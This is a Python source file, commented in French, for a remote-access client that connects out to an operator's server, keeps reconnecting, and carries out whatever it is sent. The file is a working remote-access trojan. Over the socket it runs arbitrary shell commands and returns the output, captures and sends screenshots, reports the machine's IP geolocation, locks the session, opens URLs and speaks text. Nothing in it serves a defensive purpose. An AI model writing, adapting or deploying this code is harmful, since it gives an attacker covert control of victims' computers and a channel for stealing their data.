import subprocess
import ctypes
import webbrowser
import requests
import os
import socket as sock
import pyautogui
import pyttsx3
import sys
import time
import platform
import threading

# --- CONFIGURATION ---
HOST = '127.0.0.1'  # Mets l'IP de ton serveur ici
PORT = 65432
BUFFER_SIZE = 4096

def get_local_ip():
    """Récupère l'adresse IP locale."""
    s = sock.socket(sock.AF_INET, sock.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
    except:
        local_ip = "127.0.0.1"
    finally:
        s.close()
    return local_ip

def show_popup(message):
    """Affiche une popup selon l'OS."""
    system = platform.system()
    try:
        if system == "Windows":
            ctypes.windll.user32.MessageBoxW(0, message, "Message", 0x40)
        else:
            # Fonctionne sur la majorité des Linux (Zenity ou Notify-send)
            try:
                subprocess.run(['notify-send', 'Message', message])
            except:
                subprocess.run(['zenity', '--info', '--text', message])
        return "Pop-up affichée"
    except Exception as e:
        return f"Erreur popup: {str(e)}"

def lock_session():
    """Verrouille la session selon l'OS."""
    system = platform.system()
    try:
        if system == "Windows":
            ctypes.windll.user32.LockWorkStation()
        else:
            # Commande universelle Linux pour le verrouillage
            os.system("xdg-screensaver lock")
        return "Session verrouillée"
    except Exception as e:
        return f"Erreur verrouillage: {str(e)}"

def speak(text):
    """Synthétise vocalement le texte."""
    try:
        engine = pyttsx3.init()
        engine.say(text)
        engine.runAndWait()
        return "Message vocalisé"
    except Exception as e:
        return f"Erreur voix: {str(e)}"

def main():
    print(f"[*] Client actif sur {platform.system()}. Connexion vers {HOST}...")
    
    while True: # Boucle de reconnexion automatique
        try:
            with sock.socket(sock.AF_INET, sock.SOCK_STREAM) as s:
                s.connect((HOST, PORT))
                s.sendall(f"Connecté: {platform.system()} ({get_local_ip()})".encode())

                while True:
                    command = s.recv(BUFFER_SIZE).decode('utf-8', errors='ignore')
                    if not command: break
                    
                    print(f"Commande : {command}")

                    if command.startswith("popup:"):
                        threading.Thread(target=show_popup, args=(command[6:],)).start()
                        s.sendall(b"OK: Popup lancee")
                    
                    elif command.startswith("browser:"):
                        webbrowser.open(command[8:])
                        s.sendall(b"OK: Navigateur ouvert")

                    elif command == "location":
                        try:
                            r = requests.get('https://ipinfo.io/json', timeout=5).text
                            s.sendall(r.encode())
                        except: s.sendall(b"Erreur localisation")

                    elif command.startswith("cmd:"):
                        try:
                            out = subprocess.check_output(command[4:], shell=True, stderr=subprocess.STDOUT)
                            s.sendall(out if out else b"OK")
                        except Exception as e: s.sendall(str(e).encode())

                    elif command == "screenshot":
                        try:
                            path = "scr.png"
                            pyautogui.screenshot(path)
                            with open(path, "rb") as f:
                                s.sendall(f.read())
                            os.remove(path)
                        except Exception as e: s.sendall(str(e).encode())

                    elif command == "lock":
                        s.sendall(lock_session().encode())

                    elif command.startswith("speak:"):
                        threading.Thread(target=speak, args=(command[6:],)).start()
                        s.sendall(b"OK: En train de parler")

                    elif command == "exit":
                        return

        except Exception:
            time.sleep(5) # Attend 5 secondes avant de réessayer si le serveur est coupé

if __name__ == "__main__":
    main()
